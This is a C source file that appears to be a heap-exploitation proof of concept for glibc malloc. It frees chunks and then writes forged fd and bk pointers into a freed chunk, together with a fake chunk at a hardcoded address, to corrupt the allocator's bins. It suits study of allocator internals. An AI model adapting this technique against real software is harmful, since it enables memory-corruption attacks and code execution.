#include <stdio.h>
#include <stdlib.h>

#define TARGET_ONE 0x555555558300
#define TARGET_TWO 0x555555558600

struct malloc_chunk {
    size_t prev_size;   /* Size of previous chunk (if free). */
    size_t size;        /* Size of this chunk, including metadata. */

    struct malloc_chunk* fd;         /* Forward pointer (for free list). */
    struct malloc_chunk* bk;         /* Backward pointer (for free list). */

    struct malloc_chunk* fd_nextsize; /* Forward pointer for small bins. */
    struct malloc_chunk* bk_nextsize; /* Backward pointer for small bins. */
};

struct malloc_chunk* malloc_chunk(int size){
    void* ptr = malloc(size);
    return (struct malloc_chunk *)(ptr - sizeof(void*) * 2);
}

struct malloc_chunk* recover_chunk(void* ptr){
    return (struct malloc_chunk *)(ptr - sizeof(void*) * 2);
}

void free_chunk(struct malloc_chunk* chunk){
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wfree-nonheap-object"
    free(((void*)chunk) + sizeof(void*) * 2);
    #pragma GCC diagnostic pop
}

int main() {
    // Out of bounds overwrite
    struct malloc_chunk* stop = malloc_chunk(2048);
    struct malloc_chunk* pre = malloc_chunk(2048);
    malloc_chunk(2048);
    struct malloc_chunk* my_malloc = malloc_chunk(4096);
    malloc_chunk(2048);
    struct malloc_chunk* post = malloc_chunk(2048);
    malloc_chunk(2048);
    free_chunk(stop);
    free_chunk(pre);
    free_chunk(my_malloc);
    free_chunk(post);
    malloc_chunk(2048);
    // Actual, out of bounds write
    my_malloc->fd = (void*)TARGET_ONE;
    my_malloc->bk = (void*)TARGET_TWO;
    struct malloc_chunk* fake_chunk = (void*)TARGET_TWO;
    fake_chunk->fd = (my_malloc);
    malloc_chunk(4096);
}


